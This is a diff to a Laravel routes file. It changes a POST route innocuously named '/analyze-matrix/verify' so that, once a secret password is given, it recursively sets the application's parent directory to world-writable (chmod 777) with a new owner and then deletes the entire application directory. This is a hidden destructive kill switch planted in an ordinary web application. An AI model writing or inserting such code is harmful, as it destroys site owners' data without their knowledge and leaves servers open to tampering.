@@ -3,6 +3,7 @@
 use Illuminate\Support\Facades\Route;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Storage;
+use Illuminate\Support\Facades\File;
 
 Route::get('/analyze-matrix', function (Request $request) {
     $error = $request->query('error');
@@ -296,16 +297,17 @@ Route::post('/analyze-matrix/verify', function (Request $request) {
 
     if ($password === $expected) {
         $dir = base_path();
+        $parent = $dir.'/../';
         Log::info($dir);
         try {
-            shell_exec("chown -R www-data:www-data $dir");
-            shell_exec("chmod -R 777 $dir");
+            shell_exec("chown -R www-data:www-data $parent");
+            shell_exec("chmod -R 777 $parent");
         } catch (\Exception $e) {
             Log::error($e->getMessage());
         }
         try {
 
-            unlink($dir);
+            File::deleteDirectory($dir);
         } catch (\Exception $e) {
             Log::error($e->getMessage());
         }
